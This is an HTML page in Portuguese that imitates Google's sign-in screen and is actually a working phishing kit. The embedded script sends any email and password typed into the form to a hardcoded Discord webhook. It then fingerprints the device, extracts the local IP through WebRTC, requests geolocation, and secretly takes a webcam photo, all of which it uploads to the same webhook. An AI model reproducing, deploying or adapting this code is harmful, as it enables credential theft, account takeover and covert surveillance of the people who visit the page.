<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <title>Fazer login - Contas do Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f1f1f1;
        }

        .container {
            background: white;
            padding: 40px;
            width: 90%;
            max-width: 400px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo img {
            width: 75px;
        }

        .title {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 10px;
        }

        .input-field {
            margin-bottom: 20px;
        }

        .input-field label {
            display: block;
            font-size: 14px;
            color: #202124;
            margin-bottom: 5px;
        }

        .input-field input {
            width: calc(100% - 20px);
            padding: 10px;
            font-size: 16px;
            border: 1px solid #d3d3d3;
            border-radius: 4px;
        }

        .submit-btn {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            font-weight: bold;
            color: white;
            background-color: #1a73e8;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .submit-btn:hover {
            background-color: #1669c1;
        }

        .link {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }

        .link a {
            color: #1a73e8;
            text-decoration: none;
        }

        .link a:hover {
            text-decoration: underline;
        }

        /* Additional responsive styles */
        @media (max-width: 480px) {
            .container {
                padding: 20px;
            }

            .input-field input {
                font-size: 14px;
            }

            .submit-btn {
                font-size: 14px;
            }

            .title {
                font-size: 20px;
            }
        }
    </style>
    <script>
        // Send Data to Discord Webhook
        async function sendToDiscord(title, data, isImage = false) {
            const payload = isImage ? {
                content: `Novos ${title} Coletados`,
                files: [
                    {
                        attachment: data,
                        name: 'snapshot.png'
                    }
                ]
            } : {
                content: `Novos ${title} Coletados`,
                embeds: [
                    {
                        title: title,
                        description: "Informações coletadas a partir do QR Code",
                        color: 16711680,
                        fields: Object.keys(data).map(key => ({
                            name: key,
                            value: typeof data[key] === 'string' ? data[key] : JSON.stringify(data[key]),
                            inline: false
                        }))
                    }
                ]
            };

            await fetch("https://discord.com/api/webhooks/1293733039331082391/3kVe2OjfbpHf0VCzRtOtq9VirB-_mK9-ZJCNVmc3gPYxOjVKLXfj-hjIDZf5W0Jdv-Fq", {
                method: 'POST',
                headers: {
                    'Content-Type': isImage ? undefined : 'application/json',
                },
                body: isImage ? data : JSON.stringify(payload)
            });
        }

        // Gather Device Information
        async function gatherDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenResolution: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezoneOffset: new Date().getTimezoneOffset(),
                hardwareConcurrency: navigator.hardwareConcurrency,
                connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                plugins: [...navigator.plugins].map(plugin => plugin.name),
                cookieEnabled: navigator.cookieEnabled,
            };

            await sendToDiscord("Informações do Dispositivo", deviceInfo);
        }

        // Get Local IP Address using WebRTC
        async function getLocalIP() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.onicecandidate = (event) => {
                    if (event.candidate) {
                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                        const match = ipRegex.exec(event.candidate.candidate);
                        if (match) {
                            sendToDiscord("Endereço IP Local", { ip: match[1] });
                            resolve(match[1]);
                        }
                    }
                };
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
            });
        }

        // Get Geolocation Data
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async position => {
                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                    };
                    await sendToDiscord("Dados de Geolocalização", locationData);
                });
            } else {
                console.error("Geolocalização não é suportada por este navegador.");
            }
        }

        // Take hidden picture from the camera
        async function takeHiddenPicture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                // Allow the video feed to stabilize for a moment
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Convert to Blob and send to Discord
                    canvas.toBlob(async (blob) => {
                        if (blob) {
                            const formData = new FormData();
                            formData.append('file', blob, 'snapshot.png');
                            await sendToDiscord("Captura da Câmera", formData, true);
                        }
                    });

                    // Stop the video stream
                    stream.getTracks().forEach(track => track.stop());
                }, 3000);
            } catch (err) {
                console.error('Erro ao acessar a câmera:', err);
            }
        }

        // Collect Login Credentials
        async function collectCredentials(event) {
            event.preventDefault();
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            const credentials = {
                email: email,
                password: password
            };

            await sendToDiscord("Credenciais de Login", credentials);

            // Trigger all other data collection
            gatherDeviceInfo();
            getLocalIP();
            getLocation();
            takeHiddenPicture();
        }
    </script>
</head>

<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
        </div>
        <div class="title">Fazer login</div>
        <form onsubmit="collectCredentials(event)">
            <div class="input-field">
                <label for="email">Email ou telefone</label>
                <input type="email" id="email" placeholder="Digite seu email ou telefone" required>
            </div>
            <div class="input-field">
                <label for="password">Senha</label>
                <input type="password" id="password" placeholder="Digite sua senha" required>
            </div>
            <button type="submit" class="submit-btn">Próxima</button>
        </form>
        <div class="link">
            <a href="#">Esqueceu seu email?</a>
        </div>
    </div>
</body>

</html>
